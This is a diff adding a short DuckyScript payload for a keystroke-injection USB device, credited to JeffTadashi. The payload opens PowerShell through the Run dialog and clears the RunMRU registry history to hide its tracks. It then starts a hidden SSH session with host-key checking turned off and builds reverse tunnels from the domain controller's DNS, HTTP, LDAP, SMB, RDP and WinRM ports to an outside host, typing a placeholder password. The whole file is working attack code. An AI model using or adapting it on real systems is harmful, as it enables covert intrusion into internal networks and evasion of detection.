@@ -1,0 +1,21 @@
+REM |
+REM | Written by JeffTadashi
+REM | https://github.com/JeffTadashi/omducky/
+REM |
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 3000
+STRING powershell "Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+DELAY 3000
+STRING powershell -windowstyle hidden -command ssh -fN -o "StrictHostKeyChecking=no" -R 10053:%logonserver:~2%:53 -R 10080:%logonserver:~2%:80 -R 10389:%logonserver:~2%:389 -R 10445:%logonserver:~2%:445 -R 13389:%logonserver:~2%:3389 -R 15985:%logonserver:~2%:5985 omg@192.168.200.224
+ENTER
+DELAY 2000
+REM | Below is for password (TODO: change from "yes")
+STRING yes
+ENTER
+
+
